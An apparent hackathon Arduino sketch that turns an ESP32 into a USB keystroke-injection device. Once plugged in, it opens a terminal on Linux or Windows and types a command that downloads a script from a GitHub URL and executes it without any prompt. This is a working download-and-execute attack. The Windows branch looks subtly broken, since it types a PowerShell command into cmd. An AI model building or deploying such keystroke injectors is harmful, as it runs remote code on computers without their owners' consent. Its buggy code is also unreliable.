#if ARDUINO_USB_MODE == 1
#error Arduino IDE -> Tools -> USB Mode -> Select "USB-OTG (TinyUSB)"
void setup() {}
void loop() {}
#else
#include "esp_arduino_version.h"
#if ESP_ARDUINO_VERSION < ESP_ARDUINO_VERSION_VAL(3, 3, 0)
#error ESP32 Arduino Core 3.3.0+ required
#endif
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

#define HOST 2 // LINUX: 1, WINDOWS: 2

void setup()
{
    pinMode(BOOT_PIN, INPUT_PULLUP);
    
    // Start USB stack first
    USB.begin();
    delay(1000); // Give host time to enumerate USB device
    
    // Start HID first (more critical)
    Keyboard.begin();
    delay(500); // Give HID time to initialize
    
    // Start CDC
    Serial.begin(115200);
    
    // Don't wait indefinitely for Serial
    unsigned long timeout = millis();
    while (!Serial && (millis() - timeout < 3000)) {
        delay(10);
    }
    
    if (Serial) {
        Serial.println("USB CDC ready");
    }


    openTerminal();
    downloadCheckFile();
}

#if HOST == 1
void openTerminal()
{
    // --- Linux: Ctrl+Alt+T ---
    delay(100); // Small delay before sending keys
    Keyboard.press(KEY_LEFT_CTRL);
    Keyboard.press(KEY_LEFT_ALT);
    Keyboard.press('t');
    delay(100); // Longer delay for key press
    Keyboard.releaseAll();
    delay(1000); // Wait for terminal to open
}
void downloadCheckFile()
{
    Keyboard.println("curl -o check.sh https://raw.githubusercontent.com/regularpooria/willow_qhacks2026/refs/heads/main/arduino_download_script/check.sh && chmod +x check.sh && ./check.sh");
}
#endif

#if HOST == 2
void openTerminal()
{
    // --- Windows: Win+R → cmd ---
    delay(100); // Small delay before sending keys
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100); // Longer delay for key press
    Keyboard.releaseAll();
    delay(800); // Wait for Run dialog
    
    Keyboard.print("cmd"); // Use print instead of println
    delay(100);
    Keyboard.write(KEY_RETURN);
    delay(2000); // Longer wait for cmd to open
}
void downloadCheckFile()
{
    Keyboard.println("Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/regularpooria/willow_qhacks2026/refs/heads/main/arduino_download_script/check.ps1\" -OutFile \"check.ps1\"; .\check.ps1");
}
#endif

void loop()
{
}
#endif